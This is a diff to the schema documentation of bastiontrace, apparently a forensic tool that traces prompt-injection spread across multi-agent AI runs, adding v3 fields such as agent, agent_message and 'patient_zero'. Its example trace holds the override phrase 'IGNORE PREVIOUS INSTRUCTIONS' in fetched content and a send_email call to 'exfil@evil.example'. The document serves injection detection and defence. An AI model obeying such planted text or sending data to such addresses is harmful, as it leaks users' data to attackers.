@@ -1,4 +1,4 @@
-# bastiontrace trace schema (v1)
+# bastiontrace trace schema (v3)
 
 The investigate side of the bastion trilogy:
 
@@ -118,6 +118,50 @@ and corpus patterns across earlier `tool_result` contents.
 4. **blast radius** — taint set: inject `seq` plus every event reachable
    forward through `args_from`.
 
+## v3 — multi-agent
+
+A run with several agents (an orchestrator and sub-agents, or two agents talking
+over A2A) needs two more things: **which agent** read or made each event, and the
+content **one agent handed another**. v3 adds both. It is additive: a trace that
+uses neither is still written as `v:2`, byte-identical to before.
+
+- **`agent`** (optional, every event): the agent that read the content or made the
+  call. `""` means the single/root agent.
+- **`agent_message`**: content one agent sent another. The receiver READ it, so it
+  is both a candidate inject site and a propagation edge between agents.
+
+```json
+{"type":"trace","v":3,"trace_id":"cascade-1","policy":{"forbidden_tools":["send_email"]}}
+{"type":"tool_result","seq":3,"tool":"fetch_url","agent":"researcher","source_seq":2,"content":"... IGNORE PREVIOUS INSTRUCTIONS ..."}
+{"type":"agent_message","seq":4,"from_agent":"researcher","to_agent":"orchestrator","kind":"reply","content":"...","derived_from":[3]}
+{"type":"agent_message","seq":5,"from_agent":"orchestrator","to_agent":"mailer","kind":"delegate","content":"...","derived_from":[4]}
+{"type":"tool_call","seq":6,"tool":"send_email","agent":"mailer","args":{"to":"exfil@evil.example"},"args_from":[5]}
+```
+
+| `agent_message` field | req | meaning |
+|---|---|---|
+| `from_agent` / `to_agent` | ✓ | sender / receiver (the receiver is the reading agent) |
+| `content` | ✓ | what the receiver read |
+| `kind` |  | `delegate` (default) \| `reply` \| `broadcast` |
+| `derived_from` |  | seqs the sender built this from: the propagation edges |
+
+**Header `provenance`**: `explicit` (default, omitted) or `inferred`. An inferred
+trace (e.g. imported from OTel spans) has edges reconstructed from structure, not
+recorded, so no finding on it is ever `linked`.
+
+**Edges only point backwards.** `args_from`, `source_seq` and `derived_from` must
+name an earlier `seq`; a trace with a forward or self edge is rejected. A reader
+refuses a header `v` newer than it understands, with an upgrade hint.
+
+What v3 adds to a finding:
+
+| field | meaning |
+|---|---|
+| `patient_zero` | the agent that first read the injection |
+| `agents_reached` | every agent the taint reached, in first-reach order |
+| `hops` | `agent_message` edges on the causal path (agent-to-agent jumps) |
+| `replicated` | the injection's own signal re-sent by 2 or more different agents: the worm / cascade signal (explicit provenance only) |
+
 ## Interop — bastionprobe → trace
 
 Every bastionprobe `AttackResult` maps to a 3–5 event trace, so a red-team
@@ -138,5 +182,5 @@ from what it found — mirror of bastionprobe `harden`.
 
 ## Deliberately out of schema (v1)
 
-Timestamps, token/cost fields, multi-agent `agent_id`, streaming deltas. All
-additive later without breaking `v:1`.
+Timestamps, token/cost fields, streaming deltas. All additive later without
+breaking older readers. (Multi-agent `agent` landed in v3.)
